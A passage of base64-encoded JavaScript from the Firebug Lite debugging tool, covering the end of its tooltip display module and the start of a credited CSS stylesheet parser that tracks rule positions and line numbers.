vL2RvYy5yZW1vdmVFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBicm93c2VyLm9uSW5mb1RpcE1vdXNlTW92ZSwgdHJ1ZSk7DQogICAgICAgICAgICAvLy9kb2MucmVtb3ZlRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBicm93c2VyLm9uSW5mb1RpcE1vdXNlT3V0LCB0cnVlKTsNCiAgICAgICAgICAgIC8vL2RvYy5yZW1vdmVFdmVudExpc3RlbmVyKCJtb3VzZW1vdmUiLCBicm93c2VyLm9uSW5mb1RpcE1vdXNlTW92ZSwgdHJ1ZSk7DQogICAgICAgICAgICByZW1vdmVFdmVudChkb2MsICJtb3VzZW92ZXIiLCBicm93c2VyLm9uSW5mb1RpcE1vdXNlTW92ZSk7DQogICAgICAgICAgICByZW1vdmVFdmVudChkb2MsICJtb3VzZW91dCIsIGJyb3dzZXIub25JbmZvVGlwTW91c2VPdXQpOw0KICAgICAgICAgICAgcmVtb3ZlRXZlbnQoZG9jLCAibW91c2Vtb3ZlIiwgYnJvd3Nlci5vbkluZm9UaXBNb3VzZU1vdmUpOw0KDQogICAgICAgICAgICBicm93c2VyLmluZm9UaXAucGFyZW50Tm9kZS5yZW1vdmVDaGlsZChicm93c2VyLmluZm9UaXApOw0KICAgICAgICAgICAgZGVsZXRlIGJyb3dzZXIuaW5mb1RpcDsNCiAgICAgICAgICAgIGRlbGV0ZSBicm93c2VyLm9uSW5mb1RpcE1vdXNlTW92ZTsNCiAgICAgICAgfQ0KICAgIH0sDQoNCiAgICBzaG93SW5mb1RpcDogZnVuY3Rpb24oaW5mb1RpcCwgcGFuZWwsIHRhcmdldCwgeCwgeSwgcmFuZ2VQYXJlbnQsIHJhbmdlT2Zmc2V0KQ0KICAgIHsNCiAgICAgICAgaWYgKCFGaXJlYnVnLnNob3dJbmZvVGlwcykNCiAgICAgICAgICAgIHJldHVybjsNCg0KICAgICAgICB2YXIgc2Nyb2xsUGFyZW50ID0gZ2V0T3ZlcmZsb3dQYXJlbnQodGFyZ2V0KTsNCiAgICAgICAgdmFyIHNjcm9sbFggPSB4ICsgKHNjcm9sbFBhcmVudCA/IHNjcm9sbFBhcmVudC5zY3JvbGxMZWZ0IDogMCk7DQoNCiAgICAgICAgaWYgKHBhbmVsLnNob3dJbmZvVGlwKGluZm9UaXAsIHRhcmdldCwgc2Nyb2xsWCwgeSwgcmFuZ2VQYXJlbnQsIHJhbmdlT2Zmc2V0KSkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIGh0bWxFbHQgPSBpbmZvVGlwLm93bmVyRG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50Ow0KICAgICAgICAgICAgdmFyIHBhbmVsV2lkdGggPSBodG1sRWx0LmNsaWVudFdpZHRoOw0KICAgICAgICAgICAgdmFyIHBhbmVsSGVpZ2h0ID0gaHRtbEVsdC5jbGllbnRIZWlnaHQ7DQoNCiAgICAgICAgICAgIGlmICh4K2luZm9UaXAub2Zmc2V0V2lkdGgraW5mb1RpcE1hcmdpbiA+IHBhbmVsV2lkdGgpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaW5mb1RpcC5zdHlsZS5sZWZ0ID0gTWF0aC5tYXgoMCwgcGFuZWxXaWR0aC0oaW5mb1RpcC5vZmZzZXRXaWR0aCtpbmZvVGlwTWFyZ2luKSkgKyAicHgiOw0KICAgICAgICAgICAgICAgIGluZm9UaXAuc3R5bGUucmlnaHQgPSAiYXV0byI7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaW5mb1RpcC5zdHlsZS5sZWZ0ID0gKHgraW5mb1RpcE1hcmdpbikgKyAicHgiOw0KICAgICAgICAgICAgICAgIGluZm9UaXAuc3R5bGUucmlnaHQgPSAiYXV0byI7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIGlmICh5K2luZm9UaXAub2Zmc2V0SGVpZ2h0K2luZm9UaXBNYXJnaW4gPiBwYW5lbEhlaWdodCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpbmZvVGlwLnN0eWxlLnRvcCA9IE1hdGgubWF4KDAsIHBhbmVsSGVpZ2h0LShpbmZvVGlwLm9mZnNldEhlaWdodCtpbmZvVGlwTWFyZ2luKSkgKyAicHgiOw0KICAgICAgICAgICAgICAgIGluZm9UaXAuc3R5bGUuYm90dG9tID0gImF1dG8iOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGluZm9UaXAuc3R5bGUudG9wID0gKHkraW5mb1RpcE1hcmdpbikgKyAicHgiOw0KICAgICAgICAgICAgICAgIGluZm9UaXAuc3R5bGUuYm90dG9tID0gImF1dG8iOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBpZiAoRkJUcmFjZS5EQkdfSU5GT1RJUCkNCiAgICAgICAgICAgICAgICBGQlRyYWNlLnN5c291dCgiaW5mb3RpcC5zaG93SW5mb1RpcDsgdG9wOiAiICsgaW5mb1RpcC5zdHlsZS50b3AgKw0KICAgICAgICAgICAgICAgICAgICAiLCBsZWZ0OiAiICsgaW5mb1RpcC5zdHlsZS5sZWZ0ICsgIiwgYm90dG9tOiAiICsgaW5mb1RpcC5zdHlsZS5ib3R0b20gKw0KICAgICAgICAgICAgICAgICAgICAiLCByaWdodDoiICsgaW5mb1RpcC5zdHlsZS5yaWdodCArICIsIG9mZnNldEhlaWdodDogIiArIGluZm9UaXAub2Zmc2V0SGVpZ2h0ICsNCiAgICAgICAgICAgICAgICAgICAgIiwgb2Zmc2V0V2lkdGg6ICIgKyBpbmZvVGlwLm9mZnNldFdpZHRoICsNCiAgICAgICAgICAgICAgICAgICAgIiwgeDogIiArIHggKyAiLCBwYW5lbFdpZHRoOiAiICsgcGFuZWxXaWR0aCArDQogICAgICAgICAgICAgICAgICAgICIsIHk6ICIgKyB5ICsgIiwgcGFuZWxIZWlnaHQ6ICIgKyBwYW5lbEhlaWdodCk7DQoNCiAgICAgICAgICAgIGluZm9UaXAuc2V0QXR0cmlidXRlKCJhY3RpdmUiLCAidHJ1ZSIpOw0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgICAgIHRoaXMuaGlkZUluZm9UaXAoaW5mb1RpcCk7DQogICAgfSwNCg0KICAgIGhpZGVJbmZvVGlwOiBmdW5jdGlvbihpbmZvVGlwKQ0KICAgIHsNCiAgICAgICAgaWYgKGluZm9UaXApDQogICAgICAgICAgICBpbmZvVGlwLnJlbW92ZUF0dHJpYnV0ZSgiYWN0aXZlIik7DQogICAgfSwNCg0KICAgIG9uTW91c2VPdXQ6IGZ1bmN0aW9uKGV2ZW50LCBicm93c2VyKQ0KICAgIHsNCiAgICAgICAgaWYgKCFldmVudC5yZWxhdGVkVGFyZ2V0KQ0KICAgICAgICAgICAgdGhpcy5oaWRlSW5mb1RpcChicm93c2VyLmluZm9UaXApOw0KICAgIH0sDQoNCiAgICBvbk1vdXNlTW92ZTogZnVuY3Rpb24oZXZlbnQsIGJyb3dzZXIpDQogICAgew0KICAgICAgICAvLyBJZ25vcmUgaWYgdGhlIG1vdXNlIGlzIG1vdmluZyBvdmVyIHRoZSBleGlzdGluZyBpbmZvIHRpcC4NCiAgICAgICAgaWYgKGdldEFuY2VzdG9yQnlDbGFzcyhldmVudC50YXJnZXQsICJpbmZvVGlwIikpDQogICAgICAgICAgICByZXR1cm47DQoNCiAgICAgICAgaWYgKGJyb3dzZXIuY3VycmVudFBhbmVsKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgeCA9IGV2ZW50LmNsaWVudFgsIHkgPSBldmVudC5jbGllbnRZLCB0YXJnZXQgPSBldmVudC50YXJnZXQgfHwgZXZlbnQuc3JjRWxlbWVudDsNCiAgICAgICAgICAgIHRoaXMuc2hvd0luZm9UaXAoYnJvd3Nlci5pbmZvVGlwLCBicm93c2VyLmN1cnJlbnRQYW5lbCwgdGFyZ2V0LCB4LCB5LCBldmVudC5yYW5nZVBhcmVudCwgZXZlbnQucmFuZ2VPZmZzZXQpOw0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgICAgIHRoaXMuaGlkZUluZm9UaXAoYnJvd3Nlci5pbmZvVGlwKTsNCiAgICB9LA0KDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQogICAgcG9wdWxhdGVDb2xvckluZm9UaXA6IGZ1bmN0aW9uKGluZm9UaXAsIGNvbG9yKQ0KICAgIHsNCiAgICAgICAgdGhpcy50YWdzLmNvbG9yVGFnLnJlcGxhY2Uoe3JnYlZhbHVlOiBjb2xvcn0sIGluZm9UaXApOw0KICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICB9LA0KDQogICAgcG9wdWxhdGVJbWFnZUluZm9UaXA6IGZ1bmN0aW9uKGluZm9UaXAsIHVybCwgcmVwZWF0KQ0KICAgIHsNCiAgICAgICAgaWYgKCFyZXBlYXQpDQogICAgICAgICAgICByZXBlYXQgPSAibm8tcmVwZWF0IjsNCg0KICAgICAgICB0aGlzLnRhZ3MuaW1nVGFnLnJlcGxhY2Uoe3VybFZhbHVlOiB1cmwsIHJlcGVhdDogcmVwZWF0fSwgaW5mb1RpcCk7DQoNCiAgICAgICAgcmV0dXJuIHRydWU7DQogICAgfSwNCg0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAvLyBleHRlbmRzIE1vZHVsZQ0KDQogICAgZGlzYWJsZTogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgLy8gWFhYam9lIEZvciBlYWNoIGJyb3dzZXIsIGNhbGwgdW5pbml0aWFsaXplQnJvd3Nlcg0KICAgIH0sDQoNCiAgICBzaG93UGFuZWw6IGZ1bmN0aW9uKGJyb3dzZXIsIHBhbmVsKQ0KICAgIHsNCiAgICAgICAgaWYgKHBhbmVsKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgaW5mb1RpcCA9IHBhbmVsLnBhbmVsQnJvd3Nlci5pbmZvVGlwOw0KICAgICAgICAgICAgaWYgKCFpbmZvVGlwKQ0KICAgICAgICAgICAgICAgIGluZm9UaXAgPSB0aGlzLmluaXRpYWxpemVCcm93c2VyKHBhbmVsLnBhbmVsQnJvd3Nlcik7DQogICAgICAgICAgICB0aGlzLmhpZGVJbmZvVGlwKGluZm9UaXApOw0KICAgICAgICB9DQoNCiAgICB9LA0KDQogICAgc2hvd1NpZGVQYW5lbDogZnVuY3Rpb24oYnJvd3NlciwgcGFuZWwpDQogICAgew0KICAgICAgICB0aGlzLnNob3dQYW5lbChicm93c2VyLCBwYW5lbCk7DQogICAgfQ0KfSk7DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQpGaXJlYnVnLnJlZ2lzdGVyTW9kdWxlKEZpcmVidWcuSW5mb1RpcCk7DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQp9fSk7DQoNCg0KLyogU2VlIGxpY2Vuc2UudHh0IGZvciB0ZXJtcyBvZiB1c2FnZSAqLw0KDQpGQkwubnMoZnVuY3Rpb24oKSB7IHdpdGggKEZCTCkgew0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCnZhciBDc3NQYXJzZXIgPSBudWxsOw0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KLy8gU2ltcGxlIENTUyBzdHlsZXNoZWV0IHBhcnNlciBmcm9tOg0KLy8gaHR0cHM6Ly9naXRodWIuY29tL3NlcmdlY2hlL3dlYmtpdC1jc3MNCg0KLyoqDQogKiBTaW1wbGUgQ1NTIHN0eWxlc2hlZXQgcGFyc2VyIHRoYXQgcmVtZW1iZXJzIHJ1bGUncyBsaW5lcyBpbiBmaWxlDQogKiBAYXV0aG9yIFNlcmdleSBDaGlrdXlvbm9rIChzZXJnZS5jaGVAZ21haWwuY29tKQ0KICogQGxpbmsgaHR0cDovL2NoaWt1eW9ub2sucnUNCiAqLw0KQ3NzUGFyc2VyID0gKGZ1bmN0aW9uKCl7DQogICAgLyoqDQogICAgICogUmV0dXJucyBydWxlIG9iamVjdA0KICAgICAqIEBwYXJhbSB7TnVtYmVyfSBzdGFydCBDaGFyYWN0ZXIgaW5kZXggd2hlcmUgQ1NTIHJ1bGUgZGVmaW5pdGlvbiBzdGFydHMNCiAgICAgKiBAcGFyYW0ge051bWJlcn0gYm9keV9zdGFydCBDaGFyYWN0ZXIgaW5kZXggd2hlcmUgQ1NTIHJ1bGUncyBib2R5IHN0YXJ0cw0KICAgICAqIEBwYXJhbSB7TnVtYmVyfSBlbmQgQ2hhcmFjdGVyIGluZGV4IHdoZXJlIENTUyBydWxlIGRlZmluaXRpb24gZW5kcw0KICAgICAqLw0KICAgIGZ1bmN0aW9uIHJ1bGUoc3RhcnQsIGJvZHlfc3RhcnQsIGVuZCkgew0KICAgICAgICByZXR1cm4gew0KICAgICAgICAgICAgc3RhcnQ6IHN0YXJ0IHx8IDAsDQogICAgICAgICAgICBib2R5X3N0YXJ0OiBib2R5X3N0YXJ0IHx8IDAsDQogICAgICAgICAgICBlbmQ6IGVuZCB8fCAwLA0KICAgICAgICAgICAgbGluZTogLTEsDQogICAgICAgICAgICBzZWxlY3RvcjogbnVsbCwNCiAgICAgICAgICAgIHBhcmVudDogbnVsbCwNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLyoqIEB0eXBlIHtydWxlW119ICovDQogICAgICAgICAgICBjaGlsZHJlbjogW10sDQogICAgICAgICAgICANCiAgICAgICAgICAgIGFkZENoaWxkOiBmdW5jdGlvbihzdGFydCwgYm9keV9zdGFydCwgZW5kKSB7DQogICAgICAgICAgICAgICAgdmFyIHIgPSBydWxlKHN0YXJ0LCBib2R5X3N0YXJ0LCBlbmQpOw0KICAgICAgICAgICAgICAgIHIucGFyZW50ID0gdGhpczsNCiAgICAgICAgICAgICAgICB0aGlzLmNoaWxkcmVuLnB1c2gocik7DQogICAgICAgICAgICAgICAgcmV0dXJuIHI7DQogICAgICAgICAgICB9LA0KICAgICAgICAgICAgLyoqDQogICAgICAgICAgICAgKiBSZXR1cm5zIGxhc3QgY2hpbGQgZWxlbWVudA0KICAgICAgICAgICAgICogQHJldHVybiB7cnVsZX0NCiAgICAgICAgICAgICAqLw0KICAgICAgICAgICAgbGFzdENoaWxkOiBmdW5jdGlvbigpIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gdGhpcy5jaGlsZHJlblt0aGlzLmNoaWxkcmVuLmxlbmd0aCAtIDFdOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9Ow0KICAgIH0NCiAgICANCiAgICAvKioNCiAgICAgKiBSZXBsYWNlcyBhbGwgb2NjdXJhbmNlcyBvZiBzdWJzdHJpbmcgZGVmaW5lZCBieSByZWdleHANCiAgICAgKiBAcGFyYW0ge1N0cmluZ30gc3RyDQogICAgICogQHJldHVybiB7UmVnRXhwfSByZQ0KICAgICAqIEByZXR1cm4ge1N0cmluZ30NCiAgICAgKi8NCiAgICBmdW5jdGlvbiByZW1vdmVBbGwoc3RyLCByZSkgew0KICAgICAgICB2YXIgbTsNCiAgICAgICAgd2hpbGUgKG0gPSBzdHIubWF0Y2gocmUpKSB7DQogICAgICAgICAgICBzdHIgPSBzdHIuc3Vic3RyaW5nKG1bMF0ubGVuZ3RoKTsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgcmV0dXJuIHN0cjsNCiAgICB9DQogICAgDQogICAgLyoqDQogICAgICogVHJpbXMgd2hpdGVzcGFjZSBmcm9tIHRoZSBiZWdpbm5pbmcgYW5kIHRoZSBlbmQgb2Ygc3RyaW5nDQogICAgICogQHBhcmFtIHtTdHJpbmd9IHN0cg0KICAgICAqIEByZXR1cm4ge1N0cmluZ30NCiAgICAgKi8NCiAgICBmdW5jdGlvbiB0cmltKHN0cikgew0KICAgICAgICByZXR1cm4gc3RyLnJlcGxhY2UoL15ccyt8XHMrJC9nLCAnJyk7DQogICAgfQ0KICAgIA0KICAgIC8qKg0KICAgICAqIE5vcm1hbGl6ZXMgQ1NTIHJ1bGVzIHNlbGVjdG9yDQogICAgICogQHBhcmFtIHtTdHJpbmd9IHNlbGVjdG9yDQogICAgICovDQogICAgZnVuY3Rpb24gbm9ybWFsaXplU2VsZWN0b3Ioc2VsZWN0b3IpIHsNCiAgICAgICAgLy8gcmVtb3ZlIG5ld2xpbmVzDQogICAgICAgIHNlbGVjdG9yID0gc2VsZWN0b3IucmVwbGFjZSgvW1xuXHJdL2csICcgJyk7DQogICAgICAgIA0KICAgICAgICBzZWxlY3RvciA9IHRyaW0oc2VsZWN0b3IpOw0KICAgICAgICANCiAgICAgICAgLy8gcmVtb3ZlIHNwYWNlcyBhZnRlciBjb21tYXMNCiAgICAgICAgc2VsZWN0b3IgPSBzZWxlY3Rvci5yZXBsYWNlKC9ccyosXHMqL2csICcsJyk7DQogICAgICAgIA0KICAgICAgICByZXR1cm4gc2VsZWN0b3I7DQogICAgfQ0KICAgIA0KICAgIC8qKg0KICAgICAqIFByZXByb2Nlc3NlcyBwYXJzZWQgcnVsZXM6IGFkanVzdHMgY2hhciBpbmRleGVzLCBza2lwcGluZyB3aGl0ZXNwYWNlIGFuZA0KICAgICAqIG5ld2xpbmVzLCBzYXZlcyBydWxlIHNlbGVjdG9yLCByZW1vdmVzIGNvbW1lbnRzLCBldGMuDQogICAgICogQHBhcmFtIHtTdHJpbmd9IHRleHQgQ1NTIHN0eWxlc2hlZXQNCiAgICAgKiBAcGFyYW0ge3J1bGV9IHJ1bGVfbm9kZSBDU1MgcnVsZSBub2RlDQogICAgICogQHJldHVybiB7cnVsZVtdfQ0KICAgICAqLw0KICAgIGZ1bmN0aW9uIHByZXByb2Nlc3NSdWxlcyh0ZXh0LCBydWxlX25vZGUpIHsNCiAgICAgICAgZm9yICh2YXIgaSA9IDAsIGlsID0gcnVsZV9ub2RlLmNoaWxkcmVuLmxlbmd0aDsgaSA8IGlsOyBpKyspIHsNCiAgICAgICAgICAgIHZhciByID0gcnVsZV9ub2RlLmNoaWxkcmVuW2ldLA0KICAgICAgICAgICAgICAgIHJ1bGVfc3RhcnQgPSB0ZXh0LnN1YnN0cmluZyhyLnN0YXJ0LCByLmJvZHlfc3RhcnQpLA0KICAgICAgICAgICAgICAgIGN1cl9sZW4gPSBydWxlX3N0YXJ0Lmxlbmd0aDsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gcmVtb3ZlIG5ld2xpbmVzIGZvciBiZXR0ZXIgcmVnZXhwIG1hdGNoaW5nDQogICAgICAgICAgICBydWxlX3N0YXJ0ID0gcnVsZV9zdGFydC5yZXBsYWNlKC9bXG5ccl0vZywgJyAnKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gcmVtb3ZlIEBpbXBvcnQgcnVsZXMNCi8vICAgICAgICAgICAgcnVsZV9zdGFydCA9IHJlbW92ZUFsbChydWxlX3N0YXJ0LCAvXlxzKkBpbXBvcnRccyp1cmxcKChbJyJdKT8uKz9cMT9cKVw7Py9nKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gcmVtb3ZlIGNvbW1lbnRzDQogICAgICAgICAgICBydWxlX3N0YXJ0ID0gcmVtb3ZlQWxsKHJ1bGVfc3RhcnQsIC9eXHMqXC9cKi4qP1wqXC9bXHNcdF0qLyk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIHJlbW92ZSB3aGl0ZXNwYWNlDQogICAgICAgICAgICBydWxlX3N0YXJ0ID0gcnVsZV9zdGFydC5yZXBsYWNlKC9eW1xzXHRdKy8sICcnKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgci5zdGFydCArPSAoY3VyX2xlbiAtIHJ1bGVfc3RhcnQubGVuZ3RoKTsNCiAgICAgICAgICAgIHIuc2VsZWN0b3IgPSBub3JtYWxpemVTZWxlY3RvcihydWxlX3N0YXJ0KTsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgcmV0dXJuIHJ1bGVfbm9kZTsNCiAgICB9DQogICAgDQogICAgLyoqDQogICAgICogU2F2ZXMgYWxsIGxpc2Ugc3RhcnRpbmcgaW5kZXhlcyBmb3IgZmFzdGVyIHNlYXJjaA0KICAgICAqIEBwYXJhbSB7U3RyaW5nfSB0ZXh0IENTUyBzdHlsZXNoZWV0DQogICAgICogQHJldHVybiB7TnVtYmVyW119DQogICAgICovDQogICAgZnVuY3Rpb24gc2F2ZUxpbmVJbmRleGVzKHRleHQpIHsNCiAgICAgICAgdmFyIHJlc3VsdCA9IFswXSwNCiAgICAgICAgICAgIGkgPSAwLA0KICAgICAgICAgICAgaWwgPSB0ZXh0Lmxlbmd0aCwNCiAgICAgICAgICAgIGNoLCBjaDI7DQogICAgICAgICAgICANCiAgICAgICAgd2hpbGUgKGkgPCBpbCkgew0KICAgICAgICAgICAgY2ggPSB0ZXh0LmNoYXJBdChpKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKGNoID09ICdcbicgfHwgY2ggPT0gJ1xyJykgew0KICAgICAgICAgICAgICAgIGlmIChjaCA9PSAnXHInICYmIGkgPCBpbCAtIDEgJiYgdGV4dC5jaGFyQXQoaSArIDEpID09ICdcbicpIHsNCiAgICAgICAgICAgICAgICAgICAgLy8gd2luZG93cyBsaW5lIGVuZGluZzogQ1JMRi4gU2tpcCBuZXh0IGNoYXJhY3RlciANCiAgICAgICAgICAgICAgICAgICAgaSsrOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICByZXN1bHQucHVzaChpICsgMSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgIGkrKzsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgcmV0dXJuIHJlc3VsdDsNCiAgICB9DQogICAgDQogICAgLyoqDQogICAgICogU2F2ZXMgbGluZSBudW1iZXIgZm9yIHBhcnNlZCBydWxlcw0KICAgICAqIEBwYXJhbSB7U3RyaW5nfSB0ZXh0IENTUyBzdHlsZXNoZWV0DQogICAgICogQHBhcmFtIHtydWxlfSBydWxlX25vZGUgUnVsZSBub2RlDQogICAgICogQHJldHVybiB7cnVsZVtdfQ0KICAgICAqLw0KICAgIGZ1bmN0aW9uIHNhdmVMaW5lTnVtYmVycyh0ZXh0LCBydWxlX25vZGUsIGxpbmVfaW5kZXhlcywgc3RhcnRMaW5lKSB7DQogICAgICAgIHByZXByb2Nlc3NSdWxlcyh0ZXh0LCBydWxlX25vZGUpOw0KICAgICAgICANCiAgICAgICAgc3RhcnRMaW5lID0gc3RhcnRMaW5lIHx8IDA7DQogICAgICAgIA0KICAgICAgICAvLyByZW1lbWJlciBsaW5lcyBzdGFydCBpbmRleGVzLCBwcmVzZXJ2aW5nIGxpbmUgZW5kaW5nIGNoYXJhY3RlcnMNCiAgICAgICAgaWYgKCFsaW5lX2luZGV4ZXMpDQogICAgICAgICAgICB2YXIgbGluZV9pbmRleGVzID0gc2F2ZUxpbmVJbmRleGVzKHRleHQpOw0KDQogICAgICAgIC8vIG5vdyBmaW5kIGVhY2ggcnVsZSdzIGxpbmUNCiAgICAgICAgZm9yICh2YXIgaSA9IDAsIGlsID0gcnVsZV9ub2RlLmNoaWxkcmVuLmxlbmd0aDsgaSA8IGlsOyBpKyspIHsNCiAgICAgICAgICAgIHZhciByID0gcnVsZV9ub2RlLmNoaWxkcmVuW2ldOw0KICAgICAgICAgICAgci5saW5lID0gbGluZV9pbmRleGVzLmxlbmd0aCArIHN0YXJ0TGluZTsNCiAgICAgICAgICAgIGZvciAodmFyIGogPSAwLCBqbCA9IGxpbmVfaW5kZXhlcy5sZW5ndGggLSAxOyBqIDwgamw7IGorKykgew0KICAgICAgICAgICAgICAgIHZhciBsaW5lX2l4ID0gbGluZV9pbmRleGVzW2pdOw0KICAgICAgICAgICAgICAgIGlmIChyLnN0YXJ0ID49ICBsaW5lX2luZGV4ZXNbal0gJiYgci5zdGFydCA8ICBsaW5lX2luZGV4ZXNbaiArIDFdKSB7DQogICAgICAgICAgICAgICAgICAgIHIubGluZSA9IGogKyAxICsgc3RhcnRMaW5lOw0KICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgIHNhdmVMaW5lTnVtYmVycyh0ZXh0LCByLCBsaW5lX2luZGV4ZXMpOw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICByZXR1cm4gcnVsZV9ub2RlOw0KICAgIH0NCiAgICANCiAgICByZXR1cm4gew0KICAgICAgICAvKioNCiAgICAgICAgICogUGFyc2VzIHRleHQgYXMgQ1NTIHN0eWxlc2hlZXQsIHJlbWVtYnJpbmcgZWFjaCBydWxlIHBvc2l0aW9uIGluc2lkZSANCiAgICAgICAgICogdGV4dA0KICAgICAgICAgKiBAcGFyYW0ge1N0cmluZ30gdGV4dCBDU1Mgc3R5bGVzaGVldCB0byBwYXJzZQ0KICAgICAgICAgKi8NCiAgICAgICAgcmVhZDogZnVuY3Rpb24odGV4dCwgc3RhcnRMaW5lKSB7DQogICAgICAgICAgICB2YXIgcnVsZV9zdGFydCA9IFtdLA0KICAgICAgICAgICAgICAgIHJ1bGVfYm9keV9zdGFydCA9IFtdLA0KICAgICAgICAgICAgICAgIHJ1bGVzID0gW10sDQogICAgICAgICAgICAgICAgaW5fY29tbWVudCA9IDAsDQogICAgICAgICAgICAgICAgcm9vdCA9IHJ1bGUoKSwNCiAgICAgICAgICAgICAgICBjdXJfcGFyZW50ID0gcm9vdCwNCiAgICAgICAgICAgICAgICBsYXN0X3J1bGUgPSBudWxsLA0KICAgICAgICAgICAgICAgIHN0YWNrID0gW10sDQogICAgICAgICAgICAgICAgY2gsIGNoMjsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgIHN0YWNrLmxhc3QgPSBmdW5jdGlvbigpIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gdGhpc1t0aGlzLmxlbmd0aCAtIDFdOw0KICAgICAgICAgICAgfTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgZnVuY3Rpb24gaGFzU3RyKHBvcywgc3Vic3RyKSB7DQogICAgICAgICAgICAgICAgcmV0dXJuIHRleHQuc3Vic3RyKHBvcywgc3Vic3RyLmxlbmd0aCkgPT0gc3Vic3RyOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgZm9yICh2YXIgaSA9IDAsIGlsID0gdGV4dC5sZW5ndGg7IGkgPCBpbDsgaSsrKSB7DQogICAgICAgICAgICAgICAgY2ggPSB0ZXh0LmNoYXJBdChpKTsNCiAgICAgICAgICAgICAgICBjaDIgPSBpIDwgaWwgLSAxID8gdGV4dC5jaGFyQXQoaSArIDEpIDogJyc7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYgKCFydWxlX3N0YXJ0Lmxlbmd0aCkNCiAgICAgICAgICAgICAgICAgICAgcnVsZV9zdGFydC5wdXNoKGkpOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBzd2l0Y2ggKGNoKSB7DQogICAgICAgICAgICAgICAgICAgIGNhc2UgJ0AnOg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFpbl9jb21tZW50KSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGhhc1N0cihpLCAnQGltcG9ydCcpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBtID0gdGV4dC5zdWJzdHIoaSkubWF0Y2goL15AaW1wb3J0XHMqdXJsXCgoWyciXSk/Lis/XDE/XClcOz8vKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKG0pIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGN1cl9wYXJlbnQuYWRkQ2hpbGQoaSwgaSArIDcsIGkgKyBtWzBdLmxlbmd0aCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpICs9IG1bMF0ubGVuZ3RoOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcnVsZV9zdGFydC5wb3AoKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGNhc2UgJy8nOg0KICAgICAgICAgICAgICAgICAgICAgICAgLy8geHh4cGVkcm8gYWxsb3dpbmcgY29tbWVudCBpbnNpZGUgY29tbWVudA0KICAgICAgICAg